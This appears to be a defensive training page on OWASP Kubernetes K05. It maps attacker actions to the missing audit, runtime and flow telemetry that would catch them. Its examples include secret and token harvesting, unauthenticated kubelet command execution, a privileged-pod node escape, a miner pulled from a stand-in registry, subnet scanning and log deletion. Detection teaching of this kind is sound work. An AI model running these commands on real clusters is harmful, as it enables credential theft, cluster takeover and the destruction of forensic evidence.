# K05: Inadequate Logging and Monitoring - Attack Vectors

## Table of Contents
- [Understanding the Detection Gap](#understanding-the-detection-gap)
- [Core Attack Flow (Undetected)](#core-attack-flow-undetected)
- [Attacker Activity That Goes Unnoticed](#attacker-activity-that-goes-unnoticed)
- [Chaining Blind Spots into a Sustained Breach](#chaining-blind-spots-into-a-sustained-breach)

## Understanding the Detection Gap

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can enable the telemetry that would catch them in clusters you own or are authorised to test.

K05 is unusual among the OWASP Kubernetes Top 10: there is no payload to send and no endpoint to exploit. The "attack" is simply that **ordinary malicious activity produces no alert and leaves no durable trace**. Every technique below is something an attacker does *after* gaining some foothold—and each one is invisible precisely because a specific piece of telemetry is disabled, uncollected, or unwatched.

So the right way to read this page is as a checklist of **events your cluster should be screaming about**. For each attacker action we note the signal that would have caught it, and the K05 failure that let it pass in silence.

### Core Attack Flow (Undetected)

```
1. Foothold
   |   (app RCE, exposed kubelet/API, leaked token)
   No runtime sensor -> the initial shell is never recorded
2. Reconnaissance
   |   list namespaces, secrets, service accounts, nodes
   Audit off/Metadata-only -> enumeration blends into normal traffic
3. Privilege escalation
   |   create privileged pod, bind cluster-admin, mint tokens
   No alert on RBAC changes -> escalation raises no flag
4. Objective
   |   deploy miner, read secrets, exfiltrate data, install persistence
   No alert on odd registries / egress -> objective completes quietly
5. Cleanup
   |   delete node-local pod logs, remove pods
   Logs not shipped off-node -> the only evidence is destroyed
```

## Attacker Activity That Goes Unnoticed

### 1. Interactive Shell in a Pod (`kubectl exec` / attach)

An attacker with a valid credential or a compromised operator session opens a shell inside a running container to explore and stage further actions.

```bash
kubectl exec -it payments-api-6d4 -n prod -- /bin/sh
# then, inside the container:
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
$ env | grep -i 'key\|secret\|password'
$ curl -s https://kubernetes.default/api/v1/namespaces/prod/secrets \
    -H "Authorization: Bearer $(cat .../token)" --insecure
```

**Signal that should fire**: API audit records an `exec` sub-resource on a pod; a runtime sensor records a shell process (`/bin/sh`) spawned inside a container that normally runs a single application binary.

**K05 failure**: Audit logging off (no exec record) *and* no runtime sensor (no process record) — the interactive session leaves no trace at all.

### 2. Creating a Privileged / hostPath Pod

To escape to the node or mount host filesystems, the attacker schedules a pod with dangerous settings.

```yaml
apiVersion: v1
kind: Pod
metadata: { name: debug-tools, namespace: kube-system }
spec:
  hostPID: true
  containers:
  - name: shell
    image: alpine
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
    command: ["sleep", "infinity"]
  volumes: [{ name: host, hostPath: { path: / } }]
# nsenter into PID 1 on the node from here, or chroot /host
```

**Signal that should fire**: API audit records a `create pod` with `privileged: true`/`hostPID: true`; admission logs record the decision; a runtime sensor records a sensitive host mount.

**K05 failure**: No alerting rule on privileged-pod creation, so the event—even if logged—is never surfaced to a human.

### 3. Reading Secrets and ConfigMaps at Scale

```bash
kubectl get secrets --all-namespaces -o json > /tmp/all-secrets.json
kubectl get configmaps -A -o yaml | grep -iE 'token|key|password'
```

**Signal that should fire**: API audit at `Metadata` level shows many `get/list secrets` requests from one identity; at `RequestResponse` level for the `secrets` resource it shows exactly which secrets were read.

**K05 failure**: Secrets logged only at `None`/`Metadata`, or not at all, so bulk secret harvesting is indistinguishable from routine reads and never alerted.

### 4. Service-Account Token Abuse

A compromised workload uses its auto-mounted token to talk to the API server—something that particular workload never normally does.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/apis/rbac.authorization.k8s.io/v1/clusterrolebindings
```

**Signal that should fire**: API audit ties the request to a specific `system:serviceaccount:...` identity; a baseline of normal per-SA behaviour makes the sudden API enumeration anomalous.

**K05 failure**: No audit trail keyed by identity, and no behavioural baseline, so a token being used far outside its normal scope raises nothing.

### 5. Anonymous / Unauthenticated API and kubelet Probing

```bash
# Probing the API server as system:anonymous
curl -sk https://API_SERVER:6443/api/v1/namespaces/default/pods
# Probing the read/write kubelet API directly on a node
curl -sk https://NODE:10250/pods
curl -sk https://NODE:10250/run/<ns>/<pod>/<container> -d "cmd=id"
```

**Signal that should fire**: API audit records requests from `system:anonymous`; kubelet logs record unauthenticated access; a spike of 401/403 or, worse, 200s to the kubelet is a strong indicator.

**K05 failure**: kubelet access not logged/forwarded and API audit disabled, so external probing and direct-to-node command execution go unseen.

### 6. Container Escape and On-Node Activity

```bash
# From a privileged/hostPID pod, break out to the node:
nsenter -t 1 -m -u -i -n -p -- bash
# Now acting as root on the host: read kubelet creds, other pods' secrets,
# tamper with the container runtime, add an SSH key.
```

**Signal that should fire**: A runtime sensor records `nsenter`/namespace-change syscalls, a shell in the host mount namespace, and access to sensitive host paths (kubelet kubeconfig, `/etc/kubernetes`).

**K05 failure**: No runtime sensor on the node, so the escape—the single most serious event in a cluster—produces zero telemetry.

### 7. Cryptominer Deployment

```bash
kubectl run xmrig --image=badregistry.example/miner:latest \
  --restart=Always --requests=cpu=3
# or a Deployment scaled across every node, disguised as "metrics-agent"
```

**Signal that should fire**: Image pull from an unknown/untrusted registry; a runtime sensor records a mining binary and outbound connections to a mining pool; sustained high CPU across pods.

**K05 failure**: No alert on registries outside the allow-list and no runtime/egress monitoring, so mining runs until it shows up on the cloud bill.

### 8. Lateral Movement Across Namespaces and Nodes

```bash
# Pivot using discovered tokens / network reachability
kubectl --token=$STOLEN get pods -n other-team
# East-west scanning from a compromised pod
for ip in 10.0.0.{1..254}; do nc -z -w1 $ip 6443 2>/dev/null && echo $ip; done
```

**Signal that should fire**: Audit shows one identity acting across many namespaces; network-policy logs / flow logs show unexpected east-west scanning; a runtime sensor records scanning tools running in a pod.

**K05 failure**: No network flow logging and no per-identity audit correlation, so movement between tenants and nodes is invisible.

### 9. Tampering With or Deleting the Evidence

```bash
# On a node the attacker controls, wipe node-local pod logs:
rm -f /var/log/pods/*/*/*.log
rm -f /var/log/containers/*.log
# Delete the pods they used, so `kubectl get pods` shows nothing:
kubectl delete pod debug-tools -n kube-system
```

**Signal that should fire**: If logs were already shipped off-node to append-only storage, the deletion changes nothing an investigator relies on; the delete API call is itself audited.

**K05 failure**: Logs kept only on the node the attacker controls, with no off-cluster copy, so cleanup permanently destroys the trail.

### Attacker Action -> Missing Signal Summary

| Attacker action | Signal that should catch it | K05 failure that hides it |
|-----------------|-----------------------------|---------------------------|
| Exec/attach into pod | API audit exec + runtime shell event | Audit off; no runtime sensor |
| Privileged/hostPath pod | Audit create + admission log | No alert on privileged create |
| Bulk secret reads | Audit on `secrets` resource | Secrets at None/Metadata only |
| SA token abuse | Per-identity audit + baseline | No identity-keyed audit trail |
| Anonymous API/kubelet probe | Audit anonymous + kubelet logs | kubelet unlogged; audit off |
| Container escape | Runtime syscall/mount events | No runtime sensor on nodes |
| Cryptominer deploy | Registry allow-list + egress/CPU | No registry or runtime monitoring |
| Lateral movement | Flow logs + cross-ns audit | No network logging/correlation |
| Evidence deletion | Off-node append-only storage | Logs only on the node |

## Chaining Blind Spots into a Sustained Breach

Individually, each missing signal is a gap. Together they compound into an attacker who can operate indefinitely:

```
App RCE gives a shell              -> no runtime sensor: shell unseen
        +
SA token reads all secrets         -> secrets not audited: theft unseen
        +
Privileged pod escapes to node     -> no runtime sensor: escape unseen
        +
Miner pulled from odd registry     -> no registry alert: workload unseen
        +
Node-local logs deleted            -> nothing shipped off-node: trail gone
        =  weeks-to-months of undetected control-plane compromise
```

Another common chain, driven by a leaked credential rather than an app bug:

```
Leaked kubeconfig / CI token       -> no per-identity alerting
        -> bind cluster-admin (RBAC change unaudited)
        -> create privileged DaemonSet on every node
        -> harvest secrets cluster-wide (secret reads unlogged)
        -> exfiltrate over normal egress (no flow logging)
        =  full cluster takeover, first noticed via an external report
```

## Key Takeaways

1. **The attack is silence**—K05 has no payload; the exploit is that malicious actions produce no alert and no durable trace.
2. **Every technique maps to a missing signal**—exec, privileged pods, secret reads, token abuse, escape, mining, and lateral movement each have a telemetry source that would catch them.
3. **Runtime blindness is the worst gap**—without a process-level sensor, in-container post-exploitation and node escape are completely invisible.
4. **Node-local logs are the attacker's to delete**—evidence must be shipped off-cluster in real time or it is destroyed during cleanup.
5. **Gaps compound**—several individually-tolerable blind spots combine into indefinite, unscoped dwell time.

## Next Steps

- **[Prevention Guide](prevention.md)**: Turn each missing signal into an enabled, alerting control
- **[Code Examples](examples.md)**: Insecure vs. secure audit policy, Falco rules, and pipelines
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
